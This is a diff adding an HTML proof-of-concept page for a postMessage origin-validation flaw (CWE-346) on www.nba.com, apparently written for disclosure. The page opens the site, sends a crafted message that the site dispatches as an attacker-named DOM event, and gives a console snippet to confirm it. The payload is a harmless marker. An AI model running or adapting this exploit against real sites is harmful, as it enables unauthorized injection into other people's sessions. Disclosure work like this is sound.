@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>NBA.com postMessage Origin Validation Bypass — PoC</title>
+<style>
+  body { font-family: -apple-system, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; line-height: 1.5; }
+  button { font-size: 16px; padding: 10px 20px; cursor: pointer; }
+  pre { background: #f4f4f4; padding: 12px; overflow-x: auto; border-radius: 4px; }
+  #log { background: #111; color: #0f0; padding: 12px; font-family: monospace; white-space: pre-wrap; min-height: 100px; border-radius: 4px; }
+</style>
+</head>
+<body>
+<h2>www.nba.com postMessage Origin Validation Bypass (CWE-346)</h2>
+<p>
+This page (hosted on a completely unrelated origin, e.g. GitHub Pages) opens
+<code>www.nba.com</code> and sends it a crafted <code>postMessage</code>. The receiving handler on
+nba.com performs <strong>no check of the sender's origin</strong> — it only checks that the message
+body contains <code>isStorytellerMessage: true</code>, a flag the sender fully controls. If accepted,
+nba.com dispatches a real DOM <code>CustomEvent</code> — with an attacker-chosen name and payload —
+on <code>document.body</code>, which any code on the page (not just the intended widget) can act on.
+</p>
+
+<p><strong>Steps:</strong></p>
+<ol>
+  <li>Click "Open target + attack" below. This opens <code>https://www.nba.com/</code> in a new tab
+      (simulating a victim who already has NBA.com open, or clicks a link to it from this page).</li>
+  <li>Wait for it to finish loading (~4s), then this page automatically sends the crafted message.</li>
+  <li>Switch to the NBA.com tab and open DevTools → Console. Run the verification snippet at the
+      bottom of this page there to see the injected event landing in the page's real event bus.
+      (A genuinely cross-origin attacker cannot read the result back into this page due to the
+      Same-Origin Policy — this is why step 3 is a manual verification step, exactly like a real
+      attacker would only know the injection worked once its real-world side effect fires, e.g. a
+      visible UI change in an actively-rendered widget.)</li>
+</ol>
+
+<button id="fire">Open target + attack</button>
+<div id="log">(log output will appear here)</div>
+
+<h3>What the crafted message contains</h3>
+<pre id="payload"></pre>
+
+<h3>Manual verification snippet (run in the NBA.com tab's console AFTER this page sends its message)</h3>
+<pre>document.body.addEventListener('POC_ATTACKER_EVENT', e => console.log('INJECTED:', e.detail));
+// Then re-run the attack from this PoC page (or paste the postMessage call directly here) —
+// the console will log the exact attacker-controlled payload, proving it reached nba.com's
+// internal event bus with zero origin validation.</pre>
+
+<script>
+const payload = {
+  isStorytellerMessage: true,          // the ONLY check the handler performs — fully attacker-set
+  messageType: 'POC_ATTACKER_EVENT',   // arbitrary event name — not restricted to any known enum
+  data: {
+    marker: 'INJECTED_FROM_' + location.origin,
+    note: 'This payload was delivered via postMessage from an unrelated origin with no validation.',
+    timestamp: Date.now()
+  }
+};
+document.getElementById('payload').textContent = JSON.stringify(payload, null, 2);
+
+document.getElementById('fire').addEventListener('click', () => {
+  const logEl = document.getElementById('log');
+  const log = (m) => { logEl.textContent += '\n' + m; };
+  logEl.textContent = '[*] Opening https://www.nba.com/ ...';
+
+  const target = window.open('https://www.nba.com/', 'nba_poc_target');
+  if (!target) {
+    log('[!] Popup blocked — click the button again, or allow popups for this page, or manually open nba.com in a tab and re-click.');
+    return;
+  }
+
+  log('[*] Waiting for target to load...');
+  setTimeout(() => {
+    log('[*] Sending crafted postMessage (target origin "*", i.e. delivered regardless of what nba.com actually is at that window):');
+    log(JSON.stringify(payload));
+    // This is the actual cross-origin attack call. In a real scenario the attacker's script
+    // runs on attacker.example — a completely different origin from nba.com — and nba.com's
+    // handler accepts this with no origin check whatsoever.
+    target.postMessage(payload, '*');
+    log('[*] Sent. Switch to the NBA.com tab and check the console (see verification snippet above) or watch for a live UI effect if a Storyteller widget is on-screen.');
+  }, 4000);
+});
+</script>
+</body>
+</html>
